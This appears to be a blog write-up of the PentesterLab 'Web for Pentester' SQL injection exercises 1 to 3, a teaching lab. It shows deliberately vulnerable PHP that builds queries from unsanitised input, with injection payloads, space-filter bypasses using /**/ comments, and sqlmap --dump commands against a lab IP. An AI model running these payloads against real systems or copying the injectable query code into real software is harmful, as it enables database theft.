---
layout: post
title: "PentesterLab -- Web for Pentester - SQL Injection"
date: 2016-02-20 22:14:10
comments: true
categories: [pentesterlab, sql injection, web pentest]
---

Web for Pentester:
    This exercise is a set of the most common web vulnerability 

Difficluty: 1/5

###Example 1   

code review:
```php example1.php
<?php

  require_once('../header.php');
  require_once('db.php');
	$sql = "SELECT * FROM users where name='";
	$sql .= $_GET["name"]."'";	
	$result = mysql_query($sql);
	if ($result) {
		?>
		<table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
		<?php
		while ($row = mysql_fetch_assoc($result)) {
			echo "<tr>";
    			echo "<td>".$row['id']."</td>";
    			echo "<td>".$row['name']."</td>";
    			echo "<td>".$row['age']."</td>";
			echo "</tr>";
		}	
		echo "</table>";
	}
  require_once '../footer.php';
?>

```

There is a vulnerability due to no input validation on parameter $_GET[“name”], so I can hack it directly by injecting `' or  1=1 #`. After injection, $sql now is `SELECT * FROM users where name=''  or  1=1 #`. This sql injection will pull all items in the table users.

Manually exploit (encode root' or 1=1#):

`http://192.168.79.162/sqli/example1.php?name=root%27%20or%201%3D1%23`


{% img  /images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql1_manual.JPG   [title manually exploit [alt text]] %}

sqlmap exploit:

`sqlmap -u "http://192.168.79.162/sqli/example1.php?name=root"  --dump`


{% img  /images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql1_sqlmap.JPG   [title sqlmap exploit [alt text]] %}   





###Example 2

code review:

```php example2.php
<?php
  require_once('../header.php');
  require_once('db.php');

	if (preg_match('/ /', $_GET["name"])) {
		die("ERROR NO SPACE");	
	}
	$sql = "SELECT * FROM users where name='";
	$sql .= $_GET["name"]."'";

	$result = mysql_query($sql);
	if ($result) {
		?>
		<table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
		<?php
		while ($row = mysql_fetch_assoc($result)) {
			echo "<tr>";
    			echo "<td>".$row['id']."</td>";
    			echo "<td>".$row['name']."</td>";
    			echo "<td>".$row['age']."</td>";
			echo "</tr>";
		}	
		echo "</table>";
	}
  require '../footer.php';
?>

```

The author filtered the space in the user input. It prevents us from using the  ` '  or  1=1  #`. However, this filtering is easily bypassed, using tabulation (HT or \t) or comment /**/


Manually exploit (encode '/\*\*/or/\*\*/1=1/\*\*/#):

`http://192.168.79.162/sqli/example2.php?name=root%27%2f%2a%2a%2for%2f%2a%2a%2f1%3D1%2f%2a%2a%2f%23`


{% img  /images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql2_manual.JPG   [title manually exploit [alt text]] %}

sqlmap exploit:

`sqlmap -u "http://192.168.79.162/sqli/example2.php?name=root" --dump --tamper=space2comment`

space2comment.py --- Replaces space character (' ') with comments '/**/'


{% img  /images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql2_sqlmap.JPG   [title sqlmap exploit [alt text]] %} 




###Example 3

code review:

```php example3.php
<?php
    require_once('../header.php');
  require_once('db.php');
	if (preg_match('/\s+/', $_GET["name"])) {
		die("ERROR NO SPACE");	
	}
	$sql = "SELECT * FROM users where name='";
	$sql .= $_GET["name"]."'";

	$result = mysql_query($sql);
	if ($result) {
		?>
		<table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
		<?php
		while ($row = mysql_fetch_assoc($result)) {
			echo "<tr>";
    			echo "<td>".$row['id']."</td>";
    			echo "<td>".$row['name']."</td>";
    			echo "<td>".$row['age']."</td>";
			echo "</tr>";
		}	
		echo "</table>";
	}
    require '../footer.php';
?>

```

The author filtered the spaces and tabulations in the user input. It prevents us from using the  ` '  or  1=1  #`. However, this filtering is easily bypassed, using comment /**/

Manually exploit (encode '/\*\*/or/\*\*/1=1/\*\*/#):

`http://192.168.79.162/sqli/example3.php?name=root%27%2f%2a%2a%2for%2f%2a%2a%2f1%3D1%2f%2a%2a%2f%23`


{% img  /images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql3_manual.JPG   [title manually exploit [alt text]] %}

sqlmap exploit:

`sqlmap -u "http://192.168.79.162/sqli/example3.php?name=root" --dump --tamper=space2comment`

space2comment.py --- Replaces space character (' ') with comments '/**/'


{% img  /images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql3_sqlmap.JPG   [title sqlmap exploit [alt text]] %} 

